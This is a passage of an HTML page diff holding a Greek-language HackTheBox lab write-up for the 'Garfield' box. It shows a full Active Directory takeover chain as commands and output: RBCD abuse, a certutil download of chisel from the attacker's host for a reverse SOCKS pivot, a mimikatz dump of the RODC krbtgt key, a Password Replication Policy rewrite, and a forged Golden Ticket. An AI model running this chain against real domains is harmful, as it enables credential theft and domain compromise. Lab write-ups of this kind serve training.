+<span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <!-- ══ RODC LADDER ══ -->
+  <h2>Ανεβαίνοντας τη σκάλα RODC</h2>
+
+  <p>Με τον <code>l.wilson_adm</code> στο χέρι, εμφανίζεται μια νέα ακμή που το graph <em>θα μπορούσε</em> να δει: <strong>AddSelf</strong> σε μια ομάδα ονομασμένη <code>RODC Administrators</code>. Όχι "πρόσθεσε οποιονδήποτε" — απλά "πρόσθεσε τον εαυτό σου". Μία εντολή:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">join the inner circle</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD --host &lt;DC&gt; -d garfield.htb -u l.wilson_adm -p '...' add groupMember 'RODC Administrators' 'l.wilson_adm'</span>
+<span class="pg">[+] l.wilson_adm added to RODC Administrators</span></div>
+  </div>
+
+  <p>Αυτό δίνει διοικητικό έλεγχο πάνω στον <code>RODC01</code>. Αλλά ο <code>RODC01</code> ζει στο <code>&lt;RODC-IP&gt;</code> — ένα εσωτερικό segment στο οποίο ο host μου δεν έχει route. Ο DC01 μπορεί να το φτάσει· εγώ είμαι απέξω. Τίτλος admin RODC, χωρίς τρόπο να τον χρησιμοποιήσω. Ακόμα.</p>
+
+  <h3>RBCD — πλαστογραφώντας εμπιστοσύνη</h3>
+
+  <p>Για να πάρω SYSTEM στον RODC01 χρησιμοποίησα Resource-Based Constrained Delegation: δημιούργησε έναν λογαριασμό machine από το πουθενά, πες στον RODC01 να τον εμπιστευτεί για delegation (έχω write πάνω στο αντικείμενο computer του RODC01 σαν admin του), μετά χρησιμοποίησε εκείνη την εμπιστοσύνη για να κάνεις impersonate τον <code>Administrator</code>.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">RBCD onto RODC01</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">addcomputer.py -computer-name 'FAKE01$' -computer-pass 'Passw0rd!123' -dc-ip &lt;DC&gt; 'garfield.htb/l.wilson_adm:...'</span>
+<span class="pg">[*] Successfully added machine account FAKE01$</span>
+<span class="pd">$ </span><span class="pc">rbcd.py -delegate-from 'FAKE01$' -delegate-to 'RODC01$' -action write -dc-ip &lt;DC&gt; 'garfield.htb/l.wilson_adm:...'</span>
+<span class="pg">[*] Delegation rights modified successfully!</span>
+<span class="pd">$ </span><span class="pc">TZ=UTC faketime "$(date -u -v+8H '+%F %T')" getST.py -spn cifs/RODC01.garfield.htb \
+     -impersonate Administrator -dc-ip &lt;DC&gt; 'garfield.htb/FAKE01$:Passw0rd!123'</span>
+<span class="pg">[*] Saving ticket in Administrator@cifs_RODC01.garfield.htb@GARFIELD.HTB.ccache</span></div>
+  </div>
+
+  <p>Το <code>getST</code> μιλάει μόνο στο KDC (DC01, προσβάσιμο), οπότε το ticket <code>Administrator</code>-για-<code>cifs/RODC01</code> βγαίνει χωρίς να αγγίξει το εσωτερικό segment. Εκείνο το wrapper <code>faketime</code> είναι η πρώτη εμφάνιση του clock skew ~8h — κάθε βήμα Kerberos από macOS το παίρνει, χρησιμοποιώντας ένα <em>απόλυτο</em> string ώρας DC (αυτό το build του libfaketime απορρίπτει τη μορφή offset <code>+8h</code>).</p>
+
+  <h3>chisel — μέσα στο εσωτερικό δίκτυο</h3>
+
+  <p>Ο DC01 είναι το pivot: ένα πόδι στο δίκτυό μου, ένα στο <code>&lt;internal-net&gt;</code>. Ένας reverse SOCKS proxy μέσα από αυτόν φέρνει τον RODC01 σε εμβέλεια. Το upload του Evil-WinRM είναι διαβόητα flaky, οπότε τράβηξα το binary με <code>certutil</code>:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">reverse SOCKS through DC01</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">./chisel server --reverse -p 8001            </span><span class="pco"># on my host</span>
+<span class="pd">*Evil-WinRM*</span><span class="pc"> certutil -urlcache -split -f http://&lt;VPN&gt;:8080/chisel.exe chisel.exe</span>
+<span class="pd">*Evil-WinRM*</span><span class="pc"> Start-Process .\chisel.exe -Args 'client','&lt;VPN&gt;:8001','R:socks' -WindowStyle Hidden</span>
+<span class="pco"># SOCKS now live on 127.0.0.1:1080 — RODC01:445 reachable through proxychains</span></div>
+  </div>
+
+  <!-- ══ THE MACOS FIGHT ══ -->
+  <h2>Κάνοντας Dump το krbtgt του RODC — ένας καβγάς με τα δικά μου εργαλεία</h2>
+
+  <p>Ο στόχος είναι το αφιερωμένο κλειδί KDC του RODC01, <code>krbtgt_8245</code> — η ωμή ύλη για ένα RODC Golden Ticket. Σε Kali αυτό είναι μία γραμμή. Σε macOS, αυτή η φάση έγινε ένας καβγάς τριών γύρων με το δικό μου toolchain, και αξίζει να το καταγράψω γιατί κάθε γύρος είναι ένα επαναχρησιμοποιήσιμο μάθημα.</p>
+
+  <p>Το πρώτο μου ένστικτο ήταν <code>secretsdump -use-vss</code> με το ticket Administrator — snapshot το <code>ntds.dit</code>, κάνε το parse τοπικά. Πέρασε μέσα από SAM και LSA (κάνοντας dump τα κλειδιά machine του <code>RODC01$</code> και τα cached secrets) και μετά πέθανε, επανειλημμένα, με τρεις διαφορετικούς τρόπους:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">three rounds of self-inflicted pain</span></div>
+    <div class="term-body"><span class="pco"># Γύρος 1 — impacket στο default python 3.14:</span>
+<span class="pr">KeyError: 'Cryptodome.Cipher.AES'   </span><span class="pco"># στο AES_CMAC → SMB3 signing, που απαιτεί αυτός ο DC</span>
+<span class="pco"># Διόρθωση: ξαναεγκατέστησε impacket κάτω από 3.12 → pipx install --python python3.12 impacket</span>
+
+<span class="pco"># Γύρος 2 — faketime + proxychains χρειάζονται και τα δύο DYLD_INSERT_LIBRARIES:</span>
+<span class="pco"># τα wrappers γράφουν το ένα πάνω στο άλλο, οπότε όρισε ΚΑΙ ΤΑ ΔΥΟ dylibs με το χέρι. Αλλά η προσθήκη</span>
+<span class="pco"># DYLD_FORCE_FLAT_NAMESPACE=1 ξανάσπασε το lazy AES load του Cryptodome → ίδιο KeyError.</span>
+<span class="pco"># Διόρθωση: όρισε και τα δύο libs, ΑΦΑΙΡΕΣΕ τη σημαία flat-namespace.</span>
+
+<span class="pco"># Γύρος 3 — ακόμα και τότε, το KeyError επανεμφανιζόταν στη μέση transfer σε μακριά signed reads:</span>
+<span class="pco"># μια γνωστή race lazy-import του Cryptodome στο AES_CMAC. Διόρθωση: pre-import + ζέστανε το</span>
+<span class="pco"># cipher μία φορά στο startup ώστε η race να μην τρέξει ποτέ:</span>
+<span class="pc">from Cryptodome.Cipher import AES; _ = AES.new(b'0'*16, AES.MODE_ECB)</span></div>
+  </div>
+
+  <p>Με και τα τρία διορθωμένα, το VSS επιτέλους δούλεψε και άρχισε να τραβάει το <code>ntds.dit</code> — και μετά το flaky tunnel έριξε τη σύνδεση στη μέση του transfer (<code>Bad file descriptor</code>). Το download του <code>ntds.dit</code> ήταν απλά πολύ μεγάλο για ένα link που κατέρρεε κάθε λίγα δευτερόλεπτα. Οπότε σταμάτησα να παλεύω με το μέγεθος transfer και έκανα αυτό που πραγματικά ζητούσε η κατάσταση: τρέξε <strong>mimikatz πάνω στον ίδιο τον RODC</strong> και τράβηξε μόνο τον έναν λογαριασμό που χρειαζόμουν. Μικροσκοπικό push, μικροσκοπικό output.</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">mimikatz via smbexec (SMB-only, tunnel-friendly)</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc"># push mimikatz to RODC01 over the tunnel (smbclient supports -target-ip)</span>
+<span class="pd">$ </span><span class="pc">proxychains smbclient.py -k -no-pass -target-ip &lt;RODC-IP&gt; \
+     'garfield.htb/Administrator@RODC01.garfield.htb'   →  put mimikatz.exe</span>
+<span class="pd">$ </span><span class="pc"># run it as SYSTEM via smbexec, capturing just krbtgt_8245</span>
+<span class="pd">$ </span><span class="pc">echo 'C:\Windows\Temp\mimikatz.exe "privilege::debug" \
+     "lsadump::lsa /inject /name:krbtgt_8245" "exit"' \
+   | proxychains smbexec.py -k -no-pass -target-ip &lt;RODC-IP&gt; 'garfield.htb/Administrator@RODC01...'</span>
+<span class="pg">Domain : GARFIELD / S-1-5-21-&lt;domain-SID&gt;
+User   : krbtgt_8245
+  aes256_hmac (4096) : [redacted — RODC krbtgt_8245 AES256 key]</span></div>
+  </div>
+
+  <p><em>Όλα μέσα από το tunnel χρησιμοποίησαν <code>-target-ip &lt;RODC-IP&gt;</code> για να αποφύγουν name-resolution μέσω SOCKS, ενώ κράτησαν το FQDN στο principal ώστε το SPN Kerberos να ταιριάζει.</em> Να το: το κλειδί AES256, το SID του domain, και — από το <code>msDS-SecondaryKrbTgtNumber</code> του λογαριασμού — ο αριθμός branch RODC <strong>8245</strong>. Τρία κομμάτια για να πλαστογραφήσω ένα ticket σαν οποιονδήποτε στο domain.</p>
+
+  <!-- ══ DOMAIN TAKEOVER ══ -->
+  <h2>Το Golden Ticket που δεν ήταν read-only</h2>
+
+  <p>Ένα RODC Golden Ticket έχει μια παγίδα που δεν έχει ένα κανονικό: το <strong>Password Replication Policy</strong>. Όταν ο DC01 λαμβάνει ένα TGT υπογεγραμμένο από το krbtgt ενός RODC, ελέγχει αν εκείνος ο χρήστης <em>επιτρέπεται</em> να γίνει cached σε εκείνον τον RODC. Ο <code>Administrator</code> — και κάθε privileged ομάδα — κάθεται στη λίστα <strong>deny</strong> του RODC by default. Οπότε έπρεπε να ξαναγράψω τους κανόνες. Σαν admin RODC έχω write πάνω στα δύο attributes που <em>είναι</em> η πολιτική: καθάρισε πρώτα τη λίστα deny (το deny πάντα νικά το allow), μετά πρόσθεσε τον <code>Administrator</code> στη λίστα allow:</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">rewrite the Password Replication Policy on RODC01$</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD ... set object 'RODC01$' msDS-NeverRevealGroup            </span><span class="pco"># clear deny (no value)</span>
+<span class="pg">[+] RODC01$'s msDS-NeverRevealGroup has been updated</span>
+<span class="pd">$ </span><span class="pc">bloodyAD ... set object 'RODC01$' msDS-RevealOnDemandGroup -v 'CN=Administrator,CN=Users,DC=garfield,DC=htb'</span>
+<span class="pg">[+] RODC01$'s msDS-RevealOnDemandGroup has been updated</span></div>
+  </div>
+
+  <p>Σημείωσε ότι το <code>bloodyAD set</code> <em>αντικαθιστά</em> ολόκληρο το attribute — σε ένα πραγματικό περιβάλλον, το να αντικαταστήσεις τη λίστα allow με μία μόνο καταχώρηση θα έσπαγε τη replication για κάθε νόμιμα cached λογαριασμό. Σε ένα lab είναι εντάξει, αλλά το <code>set</code> είναι σφυρί, όχι νυστέρι.</p>
+
+  <p>Τώρα το ticket. Το <code>ticketer</code> του Impacket δεν μπορεί να κωδικοποιήσει τον αριθμό branch RODC μέσα στο KVNO του ticket, οπότε αυτό το βήμα χρειάζεται <strong>Rubeus</strong> — συγκεκριμένα <strong>v2.3.3</strong>. Το v2.2.0 έχει ένα bug PAC-signing που παράγει <code>KRB_AP_ERR_BAD_INTEGRITY</code> ακόμα και με τέλειο κλειδί· ίδιο κλειδί, ίδιες παράμετροι, διαφορετική έκδοση εργαλείου, εντελώς διαφορετικό αποτέλεσμα. Το έτρεξα στον DC01 (σωστό ρολόι, απευθείας πρόσβαση KDC):</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">forge the RODC Golden Ticket + request a TGS for DC01</span></div>
+    <div class="term-body"><span class="pd">*Evil-WinRM*</span><span class="pc"> .\Rubeus.exe golden /aes256:&lt;aes256-key&gt; /user:Administrator /id:500 `
+     /domain:garfield.htb /sid:S-1-5-21-&lt;domain-SID&gt; `
+     </span><span class="py">/rodcNumber:8245</span><span class="pc"> /groups:520,512,513,519,518 /nowrap</span>
+<span class="pg">[*] Forged a TGT for 'Administrator@garfield.htb'</span>
+<span class="pd">*Evil-WinRM*</span><span class="pc"> .\Rubeus.exe asktgs /ticket:&lt;forged-TGT&gt; /service:cifs/DC01.garfield.htb /dc:DC01.garfield.htb /nowrap</span>
+<span class="pg">[+] TGS request successful!    ServiceName: cifs/DC01.garfield.htb</span></div>
+  </div>
+
+  <p>Το injection <code>/ptt</code> αποτυγχάνει μέσα στο Evil-WinRM (ένα network logon δεν έχει session να κάνει inject — <code>Error 1312</code>), οπότε το πλαστογράφησα με <code>/nowrap</code>, ζήτησα το TGS με τον ίδιο τρόπο, μετά το μετέτρεψα και το χρησιμοποίησα από τον host μου. Ο DC01 δέχτηκε ένα ticket υπογεγραμμένο από το κλειδί ενός <em>read-only</em> DC, γιατί η πολιτική που υποτίθεται θα το σταματούσε τώρα έλεγε "allow":</p>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">root</span></div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">ticketConverter.py dc01_tgs.kirbi dc01_tgs.ccache</span>
+<span class="pd">$ </span><span class="pc">KRB5CCNAME=dc01_tgs.ccache TZ=UTC faketime "$(date -u -v+8H '+%F %T')" \
+     psexec.py -k -no-pass -target-ip &lt;DC&gt; 'garfield.htb/Administrator@DC01.garfield.htb'</span>
+<span class="po">C:\Windows\system32> whoami
+</span><span class="pg">nt authority\system</span>
+<span class="po">C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt</span>
+<span class="pg">[redacted — root flag]</span></div>
+  </div>
+
+  <p>SYSTEM στον DC01. Από έναν χρήστη domain με μηδέν outbound control στο BloodHound σε πλήρη Domain Admin — μέσα από ένα ACL επιπέδου-attribute, ένα hijack logon-script, μια αλυσίδα password-reset, RBCD, ένα dump credentials RODC, και ένα πλαστογραφημένο Golden Ticket.</p>
+
+  <!-- ══ RECAP ══ -->
+  <h2>Όλη η αλυσίδα, μία οθόνη</h2>
+
+  <div class="terminal">
+    <div class="term-bar"><span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span><span class="term-label">recap</span></div>
+    <div class="term-body"><span class="pco"># 1. η αόρατη ακμή: write επιπέδου-attribute scriptPath (BloodHound-blind)</span>
+<span class="pc">bloodyAD ... get writable --detail            # scriptPath: WRITE on l.wilson / l.wilson_adm</span>
+
+<span class="pco"># 2. κατάλαβε το NTFS-εγγράψιμο logon script SYSVOL → reset ForceChangePassword</span>
+<span class="pc">smbclient //DC/SYSVOL ... put x.bat ; bloodyAD ... set object l.wilson scriptPath -v x.bat</span>
+
+<span class="pco"># 3. l.wilson_adm → AddSelf μέσα στο RODC Administrators</span>
+<span class="pc">bloodyAD ... add groupMember 'RODC Administrators' l.wilson_adm</span>
+
+<span class="pco"># 4. RBCD → ticket Administrator για RODC01· pivot SOCKS chisel στο &lt;RODC-IP&gt;</span>
+<span class="pc">addcomputer.py ... ; rbcd.py ... ; faketime getST.py -spn cifs/RODC01 -impersonate Administrator</span>
+
+<span class="pco"># 5. mimikatz στον RODC → krbtgt_8245 aes256 + SID + branch 8245</span>
+<span class="pc">proxychains smbexec.py -k ... 'mimikatz lsadump::lsa /inject /name:krbtgt_8245'</span>
+
+<span class="pco"># 6. ξαναγράψε το PRP, πλαστογράφησε το RODC Golden Ticket (Rubeus 2.3.3), TGS για DC01, psexec → root</span>
+<span class="pc">bloodyAD ... set msDS-NeverRevealGroup (clear) ; set msDS-RevealOnDemandGroup Administrator</span>
+<span class="pc">Rubeus.exe golden /aes256 /rodcNumber:8245 ... ; asktgs cifs/DC01 ; psexec.py -k → SYSTEM</span></div>
+  </div>
+
+  <!-- ══ LESSONS ══ -->
+  <h2>Μαθήματα</h2>
+
+  <p>Το Garfield έσπασε σχεδόν κάθε υπόθεση με την οποία μπήκα. Αυτό που μου έμεινε:</p>
+  <ul>
+    <li><strong>Όταν ο χάρτης δεν δείχνει δρόμους, αμφισβήτησε τον χάρτη.</strong> Το BloodHound είναι εξαιρετικό αλλά τυφλό σε DACLs επιπέδου-attribute. Ολόκληρη η αλυσίδα κρεμόταν από ένα write <code>scriptPath</code> που ποτέ δεν θα σχεδιάσει. Μην εμπιστεύεσαι ένα μόνο εργαλείο σαν τη μόνη πηγή αλήθειας σου — το <code>bloodyAD get writable</code> είναι η δεύτερη γνώμη που διαβάζει τα ψιλά γράμματα.</li>
+    <li><strong>Δοκίμασε την πρόσβαση write χειροκίνητα.</strong> Το <code>--shares</code> έλεγε READ στο SYSVOL· ο φάκελος <code>scripts</code> ήταν NTFS-εγγράψιμος όλη την ώρα. Τα δικαιώματα επιπέδου-share και επιπέδου-NTFS είναι διαφορετικά πράγματα. Ένα μόνο <code>put</code> θα είχε βρει το foothold ώρες νωρίτερα.</li>
+    <li><strong>Η ασφάλεια του RODC είναι τόσο ισχυρή όσο αυτός που ελέγχει το αντικείμενο computer.</strong> Ολόκληρο το μοντέλο "read-only" καταρρέει τη στιγμή που ένας επιτιθέμενος μπορεί να γράψει <code>msDS-RevealOnDemandGroup</code> / <code>msDS-NeverRevealGroup</code>. Και το deny πάντα νικά το allow — καθάρισε πρώτα τη λίστα deny, η σειρά έχει σημασία.</li>
+    <li><strong>Οι εκδόσεις εργαλείων και τα runtimes έχουν περισσότερη σημασία απ' όσο νομίζεις.</strong> Rubeus 2.2.0 εναντίον 2.3.3 είναι η διαφορά ανάμεσα σε <code>BAD_INTEGRITY</code> και ένα έγκυρο ticket. Το impacket σε python 3.14 εναντίον 3.12 είναι η διαφορά ανάμεσα σε ένα crash και ένα καθαρό session signing SMB3. Όταν μια επίθεση αποτυγχάνει και όλα φαίνονται σωστά, υποψιάσου το εργαλείο πριν τον εαυτό σου.</li>
+    <li><strong>Ταίριαξε το μέγεθος της τεχνικής με το transport.</strong> Ένα ολόκληρο pull VSS <code>ntds.dit</code> δεν επρόκειτο ποτέ να επιβιώσει σε ένα tunnel που κατέρρεε· το dump ενός-λογαριασμού του mimikatz ήταν μικροσκοπικό και ανθεκτικό. Σε ένα κακό link, ελαχιστοποίησε τι μετακινείς.</li>
+  </ul>
+
+  <p>Από macOS το box ήταν πραγματικά δύο boxes: η αλυσίδα AD, και ένας πιο ήσυχος καβγάς να κάνω το Kerberos, το SOCKS, και το Cryptodome να συνυπάρξουν κάτω από <code>DYLD_INSERT_LIBRARIES</code>. Άξιζαν και τα δύο.</p>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">Το προφίλ μου στο HTB &amp; περισσότερα boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Εργαλεία security &amp; automation ανοιχτού κώδικα</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← Ολα τα posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
